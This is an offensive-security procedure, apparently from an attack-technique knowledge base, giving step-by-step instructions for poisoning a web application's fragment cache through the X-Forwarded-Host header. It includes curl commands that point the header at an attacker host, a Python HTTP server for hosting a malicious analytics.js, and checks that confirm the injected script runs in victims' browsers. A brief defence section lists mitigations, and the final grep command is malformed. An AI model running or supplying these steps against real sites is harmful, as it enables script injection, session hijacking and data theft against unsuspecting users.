---
id: daf338a5-0783-4751-a995-9010d4112755
name: Internal Cache Poisoning
type: procedure
verified: true
submitted: true
created_at: '2020-09-03T17:49:18.390332+00:00'
updated_at: '2023-05-26T01:16:11.065879+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - web-cache-poisoning
  - xss
  - web-applications
commands:
  - '[[commands/curl-get-target-homepage]]'
  - '[[commands/curl-poison-with-x-forwarded-host]]'
  - '[[commands/python-simple-http-server]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Internal Cache Poisoning

## Summary

This procedure exploits internal caching mechanisms in web applications by poisoning cached response fragments through manipulation of the X-Forwarded-Host header. It allows an attacker to inject malicious JavaScript that executes when victims access the poisoned cache, potentially leading to XSS attacks, data theft, or session hijacking.

## Description

Many web applications implement partial or fragment caching to improve performance, storing small pieces of responses like script tags or links separately from the full page. If the application trusts and processes headers like X-Forwarded-Host without validation, an attacker can poison these cache entries to redirect resources (e.g., canonical links, analytics scripts, or geolocation JS) to an attacker-controlled server. When a legitimate user loads the page, the cached fragments pull and execute malicious content from the attacker's server. This technique targets applications behind proxies or CDNs that forward host headers, requiring no authentication but network access to the target. Success depends on the cache's refresh cycle and the application's header handling.

## Requirements

1. Proxy tool like [[tools/Burp-Suite]] to intercept and modify HTTP requests.
2. An attacker-controlled server to host malicious content (e.g., a simple HTTP server).
3. Network access to the target web application.
4. Knowledge of the target's caching behavior (testable via repeated requests).
5. Basic JavaScript for crafting payloads.

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all forwarded headers like X-Forwarded-Host on the server side.
- Implement cache-busting tokens or short TTLs for dynamic content fragments.
- Monitor for anomalous resource loads from unexpected domains in client-side logs.
- Use Content Security Policy (CSP) to restrict script sources.
- Log and alert on repeated requests with varying X-Forwarded-Host values.

## Objectives

1. Poison the internal cache to redirect application resources to an attacker server.
2. Serve and execute malicious JavaScript on victim browsers.
3. Achieve client-side execution without direct vulnerability exploitation.

## Instructions

### Step 1: Intercept Target Application Traffic

**Context**: Establish a man-in-the-middle position to capture and modify requests to the target application's homepage, allowing inspection of response fragments.

Use [[tools/Burp-Suite]] to proxy traffic. Configure your browser to route through Burp and navigate to the target's homepage (e.g., https://target.com).

**Command** (alternative using [[commands/curl-get-target-homepage]] for initial access):
```bash
curl -x http://127.0.0.1:8080 -k https://$_TARGET_URL/
```

> This proxies the request through Burp (running on port 8080). Expected output includes the full HTML response with embedded script tags and links. Verify that caching headers (e.g., Cache-Control) are present.

### Step 2: Send Request to Repeater and Test Header Acceptance

**Context**: Isolate the base GET request to test if the server processes the X-Forwarded-Host header, which is crucial for cache poisoning.

In Burp's HTTP History, right-click the GET / request and send it to Repeater. In Repeater, add the X-Forwarded-Host header with a test value (e.g., test.example.com) and send the request.

**Command** (equivalent test using [[commands/curl-poison-with-x-forwarded-host]]):
```bash
curl -H "X-Forwarded-Host: $_ATTACKER_HOST" -k https://$_TARGET_URL/
```

> Expected output: The response should reflect the modified host in server behavior or logs. If the server echoes or uses the header (e.g., in redirects or logs), it is vulnerable. Check for changes in response content.

### Step 3: Modify Header to Point to Attacker Server

**Context**: Alter the X-Forwarded-Host to redirect cacheable fragments to your controlled domain, poisoning the cache for subsequent requests.

In Burp Repeater, update X-Forwarded-Host to your exploit server's domain (e.g., attacker.com). Send the request multiple times to force cache population.

Repeat with [[commands/curl-poison-with-x-forwarded-host]]:
```bash
curl -H "X-Forwarded-Host: $_ATTACKER_HOST" -k https://$_TARGET_URL/
```

> Expected output: After several requests (e.g., 5-10), inspect the response. Look for poisoned elements like <link rel="canonical" href="http://attacker.com/..."> or <script src="http://attacker.com/analytics.js"></script>. Use browser dev tools to confirm.

### Step 4: Host Malicious Content on Exploit Server

**Context**: Serve fake but malicious versions of the poisoned resources (e.g., analytics.js) to execute on victim load.

Start a simple HTTP server on your attacker machine in the directory containing your malicious files.

**Command** ([[commands/python-simple-http-server]]):
```bash
python3 -m http.server $_PORT
```

> Expected output: Server logs showing binds to port (e.g., Serving HTTP on 0.0.0.0 port 8000). Place [[codes/Simple-Malicious-JavaScript-Payload]] as analytics.js or similar in the server root.

### Step 5: Verify Poisoning and Execution

**Context**: Confirm the cache is poisoned by accessing the target from a clean session and observing malicious execution.

Clear your browser cache and reload the target homepage. Check network tab for requests to attacker.com and JS execution (e.g., alert popup).

Use [[commands/curl-get-target-homepage]] to fetch and grep for attacker domain:
```bash
grep -i "attacker.com" $(curl -s -k https://$_TARGET_URL/)
```

> Expected output: Response HTML containing links/scripts to attacker.com. On victim side, malicious JS executes (e.g., alert or data exfil).

**Success Indicators**:
- Response fragments reference attacker domain.
- Malicious JS loads and runs without errors.
- No server-side validation blocks the header.
